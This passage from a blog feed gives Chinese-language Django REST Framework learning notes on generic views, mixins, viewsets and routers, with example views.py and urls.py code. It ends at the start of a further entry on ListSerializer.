class="keyword">if</span> <span class="string">'pk'</span> <span class="keyword">in</span> kwargs:</span><br><span class="line">            <span class="comment"># å•æŸ¥  RetrieveModelMixinæ–¹æ³•</span></span><br><span class="line">            response = self.retrieve(request, *args, **kwargs)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># mixinsæä¾›çš„listæ–¹æ³•çš„å“åº”å¯¹è±¡æ˜¯Responseï¼Œå°†è¯¥å¯¹è±¡æ ¼å¼åŒ–ä¸ºè‡ªå®šä¹‰çš„APIResponse</span></span><br><span class="line">            response = self.list(request, *args, **kwargs)  <span class="comment"># ç¾¤æŸ¥ ListModelMixin</span></span><br><span class="line">        <span class="comment"># responseçš„æ•°æ®éƒ½å­˜æ”¾åœ¨response.dataä¸­</span></span><br><span class="line">        <span class="keyword">return</span> APIResponse(results=response.data)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å•å¢</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        response = self.create(request, *args, **kwargs)  <span class="comment"># CreateModelMixinæ–¹æ³•</span></span><br><span class="line">        <span class="keyword">return</span> APIResponse(results=response.data)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å•æ•´ä½“ä¿®æ”¹</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">put</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        response = self.update(request, *args, **kwargs)  <span class="comment"># UpdateModelMixin</span></span><br><span class="line">        <span class="keyword">return</span> APIResponse(results=response.data)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å•å±€éƒ¨ä¿®æ”¹</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">patch</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        response = self.partial_update(request, *args, **kwargs)</span><br><span class="line">        <span class="keyword">return</span> APIResponse(results=response.data)</span><br></pre></td></tr></table></figure><h3 id="è·¯ç”±å±‚-urls-py-1"><a href="#è·¯ç”±å±‚-urls-py-1" class="headerlink" title="è·¯ç”±å±‚ urls.py"></a>è·¯ç”±å±‚ <code>urls.py</code></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">'v3/books/'</span>, views.BookMixinGenericAPIView.as_view()),</span><br><span class="line">    path(<span class="string">'v3/books/&lt;pk&gt;/'</span>, views.BookMixinGenericAPIView.as_view()),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h1 id="xxxAPIView-åŠŸèƒ½æ€§å­è§†å›¾ç±»"><a href="#xxxAPIView-åŠŸèƒ½æ€§å­è§†å›¾ç±»" class="headerlink" title="xxxAPIView - åŠŸèƒ½æ€§å­è§†å›¾ç±»"></a>xxxAPIView - åŠŸèƒ½æ€§å­è§†å›¾ç±»</h1><p>åŠŸèƒ½æ€§å­è§†å›¾ç±»ç»§æ‰¿äº†<code>GenericAPIView</code>å’Œå„ç§<code>Mixins</code>å·¥å…·ç±»</p><ol><li>åŠŸèƒ½æ€§è§†å›¾ç±»éƒ½æ˜¯<code>GenericAPIView</code>çš„å­ç±»ï¼Œä¸”ä¸åŒçš„å­ç±»ç»§æ‰¿äº†ä¸åŒçš„å·¥å…·ç±»</li><li>å·¥åŠŸèƒ½æ€§è§†å›¾ç±»çš„åŠŸèƒ½å¯ä»¥æ»¡è¶³éœ€æ±‚ï¼Œåªéœ€è¦ç»§æ‰¿å·¥å…·è§†å›¾ï¼Œå¹¶ä¸”æä¾›<code>queryset</code>ä¸<code>serializer_class</code>å³å¯</li></ol><h2 id="å„å¤§åŠŸèƒ½å­è§†å›¾ç±»"><a href="#å„å¤§åŠŸèƒ½å­è§†å›¾ç±»" class="headerlink" title="å„å¤§åŠŸèƒ½å­è§†å›¾ç±»"></a>å„å¤§åŠŸèƒ½å­è§†å›¾ç±»</h2><p>ä¸€è¡¨èƒœåƒè¨€ï¼š</p><table><thead><tr><th>è§†å›¾</th><th>ä½œç”¨</th><th>è¯·æ±‚ç±»å‹</th><th>çˆ¶ç±»</th></tr></thead><tbody><tr><td>ListAPIView</td><td>æŸ¥è¯¢å¤šæ¡æ•°æ®</td><td>get</td><td>GenericAPIView <br/> ListModelMixin</td></tr><tr><td>CreateAPIView</td><td>æ–°å¢ä¸€æ¡æ•°æ®</td><td>post</td><td>GenericAPIView <br/> CreateModelMixin</td></tr><tr><td>RetrieveAPIView</td><td>æŸ¥è¯¢ä¸€æ¡æ•°æ®</td><td>get</td><td>GenericAPIView <br/> RetrieveModelMixin</td></tr><tr><td>UpdateAPIView</td><td>ä¿®æ”¹ä¸€æ¡æ•°æ®</td><td>put <br/> patch</td><td>GenericAPIView  <br/>UpdateModelMixin</td></tr><tr><td>DestroyAPIView</td><td>åˆ é™¤ä¸€æ¡æ•°æ®</td><td>delete</td><td>GenericAPIView <br/> DestroyModelMixin</td></tr><tr><td>RetrieveUpdateAPIView</td><td>å•æŸ¥ <br/> æ›´æ–°ä¸€æ¡æ•°æ®</td><td>get<br/>put<br/>patch</td><td>GenericAPIView<br/>RetrieveModelMixin<br/>UpdateModelMixin</td></tr><tr><td>RetrieveUpdateDestroyAPIView</td><td>å•æŸ¥<br/>æ›´æ–°<br/>åˆ é™¤ä¸€æ¡æ•°æ®</td><td>get<br/>put<br/>patch<br/>delete</td><td>GenericAPIView<br/> RetrieveModelMixin<br/>UpdateModelMixin<br/>DestroyModelMixin</td></tr><tr><td>ListCreateAPIView</td><td>ç¾¤æŸ¥<br/>æ›´æ–°ä¸€æ¡</td><td>get<br/>post</td><td>GenericAPIView<br/>ListModelMixin<br/>mixins.CreateModelMixin</td></tr></tbody></table><h2 id="ç¤ºä¾‹ä»£ç -3"><a href="#ç¤ºä¾‹ä»£ç -3" class="headerlink" title="ç¤ºä¾‹ä»£ç "></a>ç¤ºä¾‹ä»£ç </h2><h3 id="è§†å›¾å±‚-views-py-2"><a href="#è§†å›¾å±‚-views-py-2" class="headerlink" title="è§†å›¾å±‚ views.py"></a>è§†å›¾å±‚ <code>views.py</code></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework.generics <span class="keyword">import</span> ListCreateAPIView, UpdateAPIView</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BookListCreatePIView</span><span class="params">(ListCreateAPIView, UpdateAPIView)</span>:</span></span><br><span class="line">    queryset = models.Book.objects.filter(is_delete=<span class="literal">False</span>)</span><br><span class="line">    serializer_class = serializers.BookModelSerializer</span><br></pre></td></tr></table></figure><h3 id="è·¯ç”±å±‚-urls-py-2"><a href="#è·¯ç”±å±‚-urls-py-2" class="headerlink" title="è·¯ç”±å±‚ urls.py"></a>è·¯ç”±å±‚ <code>urls.py</code></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">'v4/books/'</span>, views.BookListCreatePIView.as_view()),</span><br><span class="line">    path(<span class="string">'v4/books/&lt;pk&gt;/'</span>, views.BookListCreatePIView.as_view()),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h1 id="xxxViewset-è§†å›¾é›†"><a href="#xxxViewset-è§†å›¾é›†" class="headerlink" title="xxxViewset - è§†å›¾é›†"></a>xxxViewset - è§†å›¾é›†</h1><h2 id="å¸¸ç”¨è§†å›¾é›†çˆ¶ç±»"><a href="#å¸¸ç”¨è§†å›¾é›†çˆ¶ç±»" class="headerlink" title="å¸¸ç”¨è§†å›¾é›†çˆ¶ç±»"></a>å¸¸ç”¨è§†å›¾é›†çˆ¶ç±»</h2><h3 id="ViewSetMixin"><a href="#ViewSetMixin" class="headerlink" title="ViewSetMixin"></a>ViewSetMixin</h3><p><code>ViewSetMixin</code>ä¸»è¦æ˜¯è‡ªå®šä¹‰äº†<code>as_view</code>æ–¹æ³•ï¼Œä½¿å¯ä»¥é€šè¿‡å…¶å‚æ•°æŒ‡å®š <code>HTTP_METHOD</code>ä¸å‡½æ•°çš„æ˜ å°„å…³ç³»ï¼Œå¦‚ <code>view = MyViewSet.as_view({&#39;get&#39;: &#39;list&#39;, &#39;post&#39;: &#39;create&#39;})</code></p><h3 id="ViewSet"><a href="#ViewSet" class="headerlink" title="ViewSet"></a>ViewSet</h3><p>ç»§æ‰¿è‡ª<code>APIView</code>å’Œ<code>ViewSetMixin</code>ï¼Œæ²¡æœ‰æä¾›ä»»ä½•æ–¹æ³•ï¼Œéœ€è¦è‡ªå·±å†™</p><h3 id="GenericViewSet"><a href="#GenericViewSet" class="headerlink" title="GenericViewSet"></a>GenericViewSet</h3><p>ç»§æ‰¿<code>GenericAPIView</code>å’Œ<code>ViewSetMixin</code>ï¼Œå…¶ä¸­<code>GenericAPIView</code>æä¾›äº†åŸºç¡€æ–¹æ³•ï¼Œå¯ä»¥ç›´æ¥æ­é…<code>Mixin</code>æ‰©å±•ç±»ä½¿ç”¨ï¼Œå› æ­¤æ¯”è¾ƒå¸¸ç”¨</p><h3 id="ModelViewSet"><a href="#ModelViewSet" class="headerlink" title="ModelViewSetã€€ã€€"></a>ModelViewSetã€€ã€€</h3><p>ç»§æ‰¿<code>GenericViewset</code>ï¼Œä½†åŒæ—¶ä¹ŸåŒ…æ‹¬<code>ListModelMixin</code>ã€<code>CreateModelMixin</code>ç­‰<code>mixin</code>æ‰©å±•ç±»</p><h2 id="æºç åˆ†æ"><a href="#æºç åˆ†æ" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h2><ol><li>è§†å›¾é›†éƒ½æ˜¯é»˜è®¤ä¼˜å…ˆç»§æ‰¿<code>ViewSetMixin</code>ç±»ï¼Œå†ç»§æ‰¿ä¸€ä¸ªè§†å›¾ç±»ï¼ˆ<code>GenericAPIView</code>æˆ–<code>APIView</code>ï¼‰</li><li><code>ViewSetMixin</code>æä¾›äº†é‡å†™çš„<code>as_view()</code>æ–¹æ³•ï¼Œç»§æ‰¿è§†å›¾é›†çš„è§†å›¾ç±»ï¼Œé…ç½®è·¯ç”±æ—¶è°ƒç”¨<code>as_view()</code>å¿…é¡»ä¼ å…¥ è¯·æ±‚å-å‡½æ•°å æ˜ å°„å…³ç³»å­—å…¸</li></ol><p>ä¾‹å¦‚: </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">path(<span class="string">'v5/books/'</span>, views.BookGenericViewSet.as_view(&#123;<span class="string">'get'</span>: <span class="string">'my_get_list'</span>&#125;)),</span><br></pre></td></tr></table></figure><p>è¡¨ç¤º<code>get</code>è¯·æ±‚ä¼šäº¤ç»™<code>my_get_list</code>è§†å›¾å‡½æ•°å¤„ç†</p><h2 id="GenericViewSet-ç¤ºä¾‹ä»£ç "><a href="#GenericViewSet-ç¤ºä¾‹ä»£ç " class="headerlink" title="GenericViewSet ç¤ºä¾‹ä»£ç "></a>GenericViewSet ç¤ºä¾‹ä»£ç </h2><h3 id="è·¯ç”±å±‚-urls-py-3"><a href="#è·¯ç”±å±‚-urls-py-3" class="headerlink" title="è·¯ç”±å±‚ urls.py"></a>è·¯ç”±å±‚ urls.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">urlpatterns = [</span><br><span class="line">       <span class="comment"># Viewçš„as_view()ï¼šå°†getè¯·æ±‚æ˜ å°„åˆ°è§†å›¾ç±»çš„getæ–¹æ³•</span></span><br><span class="line">    <span class="comment"># ViewSetçš„as_view(&#123;'get': 'my_get_list'&#125;)ï¼šå°†getè¯·æ±‚æ˜ å°„åˆ°è§†å›¾ç±»çš„my_get_listæ–¹æ³•</span></span><br><span class="line">    path(<span class="string">'v5/books/'</span>,</span><br><span class="line">         views.BookGenericViewSet.as_view(&#123;<span class="string">'get'</span>: <span class="string">'my_get_list'</span>&#125;)),</span><br><span class="line">    path(<span class="string">'v5/books/&lt;pk&gt;/'</span>,</span><br><span class="line">         views.BookGenericViewSet.as_view(&#123;<span class="string">'get'</span>: <span class="string">'my_get_obj'</span>&#125;)),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h3 id="è§†å›¾å±‚-views-py-3"><a href="#è§†å›¾å±‚-views-py-3" class="headerlink" title="è§†å›¾å±‚ views.py"></a>è§†å›¾å±‚ views.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework.viewsets <span class="keyword">import</span> GenericViewSet</span><br><span class="line"><span class="keyword">from</span> rest_framework <span class="keyword">import</span> mixins  <span class="comment">#å·¥å…·é›† å¯ä»¥ä½¿ç”¨list,retrieveç­‰æ–¹æ³•</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BookGenericViewSet</span><span class="params">(RetrieveModelMixin, ListModelMixin, GenericViewSet)</span>:</span></span><br><span class="line">    queryset = models.Book.objects.filter(is_delete=<span class="literal">False</span>)</span><br><span class="line">    serializer_class = serializers.BookModelSerializer</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">my_get_list</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.list(request, *args, **kwargs)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">my_get_obj</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.retrieve(request, *args, **kwargs)</span><br></pre></td></tr></table></figure><h2 id="GenericViewSetä¸ViewSet"><a href="#GenericViewSetä¸ViewSet" class="headerlink" title="GenericViewSetä¸ViewSet"></a><code>GenericViewSet</code>ä¸<code>ViewSet</code></h2><h3 id="å¼‚åŒ"><a href="#å¼‚åŒ" class="headerlink" title="å¼‚åŒ"></a>å¼‚åŒ</h3><ol><li><code>GenericViewSet</code>å’Œ<code>ViewSet</code>éƒ½ç»§æ‰¿äº†<code>ViewSetMixin</code>ï¼Œ<code>as_view</code>éƒ½å¯ä»¥é…ç½® è¯·æ±‚-å‡½æ•° æ˜ å°„</li><li><code>GenericViewSet</code>ç»§æ‰¿çš„æ˜¯<code>GenericAPIView</code>è§†å›¾ç±»ï¼Œç”¨æ¥å®Œæˆæ ‡å‡†çš„ <code>model</code> ç±»æ“ä½œæ¥å£</li><li><code>ViewSet</code>ç»§æ‰¿çš„æ˜¯<code>APIView</code>è§†å›¾ç±»ï¼Œç”¨æ¥å®Œæˆä¸éœ€è¦ <code>model</code> ç±»å‚ä¸ï¼Œæˆ–æ˜¯éæ ‡å‡†çš„ <code>model</code> ç±»æ“ä½œæ¥å£ï¼Œå¦‚<ul><li><code>post</code>è¯·æ±‚åœ¨æ ‡å‡†çš„ <code>model</code> ç±»æ“ä½œä¸‹å°±æ˜¯æ–°å¢æ¥å£ï¼Œç™»é™†çš„<code>post</code>ä¸æ»¡è¶³ã€‚ç™»é™†çš„postè¯·æ±‚ï¼Œå¹¶ä¸æ˜¯å®Œæˆæ•°æ®çš„æ–°å¢ï¼Œåªæ˜¯ç”¨postæäº¤æ•°æ®ï¼Œå¾—åˆ°çš„ç»“æœä¹Ÿä¸æ˜¯ç™»é™†çš„ç”¨æˆ·ä¿¡æ¯ï¼Œè€Œæ˜¯ç™»é™†çš„è®¤è¯ä¿¡æ¯</li><li><code>post</code>è¯·æ±‚éªŒè¯ç çš„æ¥å£ï¼Œä¸éœ€è¦ <code>model</code> ç±»çš„å‚ä¸</li></ul></li></ol><h3 id="æºç "><a href="#æºç " class="headerlink" title="æºç "></a>æºç </h3><ul><li>GenericViewSet</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># viewsets.py</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GenericViewSet</span><span class="params">(ViewSetMixin, generics.GenericAPIView)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    The GenericViewSet class does not provide any actions by default,</span></span><br><span class="line"><span class="string">    but does include the base set of generic view behavior, such as</span></span><br><span class="line"><span class="string">    the `get_object` and `get_queryset` methods.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># generics.py</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GenericAPIView</span><span class="params">(views.APIView)</span>:</span></span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># vies.py</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">APIView</span><span class="params">(View)</span>:</span></span><br><span class="line">    <span class="comment"># ...</span></span><br></pre></td></tr></table></figure><ul><li>ViewSet</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ViewSet</span><span class="params">(ViewSetMixin, views.APIView)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    The base ViewSet class does not provide any actions by default.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># vies.py</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">APIView</span><span class="params">(View)</span>:</span></span><br><span class="line">    <span class="comment"># ...</span></span><br></pre></td></tr></table></figure><h2 id="ModelViewSet-ç¤ºä¾‹ä»£ç "><a href="#ModelViewSet-ç¤ºä¾‹ä»£ç " class="headerlink" title="ModelViewSet ç¤ºä¾‹ä»£ç "></a>ModelViewSet ç¤ºä¾‹ä»£ç </h2><h3 id="è·¯ç”±å±‚-urls-py-4"><a href="#è·¯ç”±å±‚-urls-py-4" class="headerlink" title="è·¯ç”±å±‚ urls.py"></a>è·¯ç”±å±‚ urls.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">'v6/books/'</span>,</span><br><span class="line">         views.BookModelViewSet.as_view(&#123;<span class="string">'get'</span>: <span class="string">'list'</span>, <span class="string">'post'</span>: <span class="string">'create'</span>&#125;)),</span><br><span class="line">    path(<span class="string">'v6/books/&lt;pk&gt;/'</span>, </span><br><span class="line">        views.BookModelViewSet.as_view(&#123;<span class="string">'get'</span>: <span class="string">'retrieve'</span>, <span class="string">'put'</span>: <span class="string">'update'</span>, <span class="string">'patch'</span>: <span class="string">'partial_update'</span>, <span class="string">'delete'</span>: <span class="string">'destroy'</span>&#125;)),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h3 id="è§†å›¾å±‚-views-py-4"><a href="#è§†å›¾å±‚-views-py-4" class="headerlink" title="è§†å›¾å±‚ views.py"></a>è§†å›¾å±‚ views.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BookModelViewSet</span><span class="params">(ModelViewSet)</span>:</span></span><br><span class="line">    queryset = models.Book.objects.filter(is_delete=<span class="literal">False</span>)</span><br><span class="line">    serializer_class = serializers.BookModelSerializer</span><br><span class="line"></span><br><span class="line">    <span class="comment"># åˆ ä¸æ˜¯æ•°æ®åº“ï¼Œè€Œæ˜¯è¯¥è®°å½•ä¸­çš„ä¿®æ”¹is_deleteçš„å€¼ï¼Œå› æ­¤é‡å†™é»˜è®¤çš„destroyå‡½æ•°</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">destroy</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        instance = self.get_object()  <span class="comment"># type: models.Book</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> instance:</span><br><span class="line">            <span class="keyword">return</span> APIResponse(<span class="number">1</span>, <span class="string">'åˆ é™¤å¤±è´¥'</span>)  <span class="comment"># å®é™…æ“ä½œï¼Œåœ¨æ­¤ä¹‹å‰å°±åšäº†åˆ¤æ–­</span></span><br><span class="line">        instance.is_delete = <span class="literal">True</span></span><br><span class="line">        instance.save()</span><br><span class="line">        <span class="keyword">return</span> APIResponse(<span class="number">0</span>, <span class="string">'åˆ é™¤æˆåŠŸ'</span>)</span><br></pre></td></tr></table></figure><h1 id="è·¯ç”±ç»„ä»¶"><a href="#è·¯ç”±ç»„ä»¶" class="headerlink" title="è·¯ç”±ç»„ä»¶"></a>è·¯ç”±ç»„ä»¶</h1><p>å› ä¸ºå…·æœ‰å±€é™æ€§ï¼Œæ‰€ä»¥åœ¨å¼€å‘å¤æ‚æ¥å£æ—¶å¹¶ä¸æ˜¯é¦–é€‰ã€‚</p><p>ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path, include</span><br><span class="line"><span class="keyword">from</span> rest_framework.routers <span class="keyword">import</span> SimpleRouter</span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">router = SimpleRouter()</span><br><span class="line"><span class="comment"># æ‰€æœ‰è·¯ç”±ä¸ViewSetè§†å›¾ç±»çš„éƒ½å¯ä»¥æ³¨å†Œï¼Œä¼šäº§ç”Ÿ 'v7/books/' å’Œ 'v7/books/&lt;pk&gt;/'</span></span><br><span class="line">router.register(<span class="string">'v7/books'</span>, views.BookModelViewSet)</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    <span class="comment"># router.urlsæ·»åŠ æ–¹æ³•ä¸€</span></span><br><span class="line">    <span class="comment"># path('', include(router.urls)),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># router.urlsæ·»åŠ æ–¹æ³•äºŒ</span></span><br><span class="line"><span class="comment"># urlpatterns += router.urls</span></span><br></pre></td></tr></table></figure><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>ä¸€å›¾èƒœåƒè¨€ï¼ŒéåŸåˆ›ï¼Œå‡æ¥è‡ªç½‘ç»œï¼š</p><img data-src="/tech/drf-learning-notes-10-generic-views-mixins-viewsets-and-routers/1.png" class="" title="å›¾1"><img data-src="/tech/drf-learning-notes-10-generic-views-mixins-viewsets-and-routers/2.jpg" class="" title="å›¾2">]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Backend </tag>
            
            <tag> Django </tag>
            
            <tag> Django REST Framework </tag>
            
            <tag> DRF </tag>
            
            <tag> Learning Notes </tag>
            
            <tag> Tech </tag>
            
            <tag> Dev </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Django REST Framework å­¦ä¹ ç¬”è®°ï¼ˆä¹ï¼‰ï¼šåºåˆ—åŒ–æ¨¡å— serialziers ä¹‹ ListSerializerç±»</title>
      <link href="/tech/drf-learning-notes-9-the-listserializer-class-in-serialziers-module/"/>
      <url>/tech/drf-learning-notes-9-the-listserializer-class-in-serialziers-module/</url>
      
        <content type="html"><![CDATA[<ul><li>Title(EN): <em><strong>Django REST Framework Learning Notes (8): the ModelSerializer class in serialziers module</strong></em></li><li>Author: dog2</li></ul><hr><h1 id="åŸºæœ¬ä¿¡æ¯"><a href="#åŸºæœ¬ä¿¡æ¯" class="headerlink" title="åŸºæœ¬ä¿¡æ¯"></a>åŸºæœ¬ä¿¡æ¯</h1><ul><li>æºç ï¼š<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2VuY29kZS9kamFuZ28tcmVzdC1mcmFtZXdvcmsvYmxvYi9tYXN0ZXIvcmVzdF9mcmFtZXdvcmsvc2VyaWFsaXplcnMucHk=">rest_framework.serializers<i class="fa fa-external-link-alt"></i></span></li><li>å®˜æ–¹æ–‡æ¡£<ul><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvc2VyaWFsaXplcnMv">API Guild - Serializers<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvZmllbGRzLw==">API Guild - Serializer fields<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvcmVsYXRpb25zLw==">API Guild - Serializer relations<i class="fa fa-external-link-alt"></i></span></li></ul></li><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RvZy0yL2hlbGxvX2RyZi90cmVlL21hc3Rlci9ubzlfZHJmX0xpc3RTZXJpYWxpemVy">æœ¬æ–‡demoä»£ç Github<i class="fa fa-external-link-alt"></i></span></li></ul><p>DRFå¸¸ç”¨åºåˆ—åŒ–ç±»ä¸»è¦æœ‰</p><ul><li><code>rest_framework.serialziers.Serializer</code></li><li><code>rest_framework.serialziers.ModelSerializer</code></li><li><code>rest_framework.serialziers.ListSerializer</code></li></ul><p>æœ¬ç¯‡ä»‹ç»<code>rest_framework.serialziers.ListSerializer</code>ï¼Œå°†ç»§ç»­ä»¥å›¾ä¹¦ç®¡ç†ç³»ç»Ÿå®ä¾‹è¯´æ˜ã€‚</p><a id="more"></a><h1 id="ä½¿ç”¨åœºæ™¯ä¹‹ç¾¤æ”¹ç¾¤å¢ç¾¤æ”¹"><a href="#ä½¿ç”¨åœºæ™¯ä¹‹ç¾¤æ”¹ç¾¤å¢ç¾¤æ”¹" class="headerlink" title="ä½¿ç”¨åœºæ™¯ä¹‹ç¾¤æ”¹ç¾¤å¢ç¾¤æ”¹"></a>ä½¿ç”¨åœºæ™¯ä¹‹ç¾¤æ”¹ç¾¤å¢ç¾¤æ”¹</h1><p>å½“ä¸€ä¸ªåºåˆ—åŒ–å™¨åœ¨å¸¦æœ‰<code>many=True</code>é€‰é¡¹è¢«åºåˆ—åŒ–æ—¶ï¼Œå°†åˆ›å»ºä¸€ä¸ª<code>ListSerializer</code>å®ä¾‹ï¼Œè¯¥åºåˆ—åŒ–å™¨ç±»å°†æˆä¸º<code>ListSerializer</code>ç±»çš„å­ç±»ã€‚<br>å½“ä½ éœ€è¦è‡ªå®šä¹‰å¤šä¸ªå¯¹è±¡çš„è¡Œä¸ºæ—¶ï¼ˆæ¯”å¦‚ç¾¤å¢ï¼Œç¾¤æ”¹ï¼‰,ä½ éœ€è¦æ‰‹åŠ¨å®šåˆ¶<code>ListSerializer</code>ç±»çš„ä¸€äº›è¡Œä¸ºã€‚<br>å¯ä»¥é€šè¿‡åœ¨è‡ªå®šä¹‰åºåˆ—åŒ–å™¨çš„<code>Meta</code>ç±»ä¸‹é¢çš„<code>list_serializer_class</code>æ¥ç»‘å®šä½ éœ€è¦çš„çš„<code>ListSerializer</code>ç±»</p><h1 id="ç¤ºä¾‹ä»£ç "><a href="#ç¤ºä¾‹ä»£ç " class="headerlink" title="ç¤ºä¾‹ä»£ç "></a>ç¤ºä¾‹ä»£ç </h1><p>ç¾¤æ”¹éœ€è¦è®¾ç½®<code>ListSerializer</code>ï¼Œåˆ›å»º<code>BookListSerializer</code>ç»§æ‰¿<code>ListSerializer</code>ï¼Œé‡å†™<code>update</code>æ–¹æ³•</p><h2 id="åºåˆ—åŒ–å±‚-serializer-py"><a href="#åºåˆ—åŒ–å±‚-serializer-py" class="headerlink" title="åºåˆ—åŒ–å±‚ 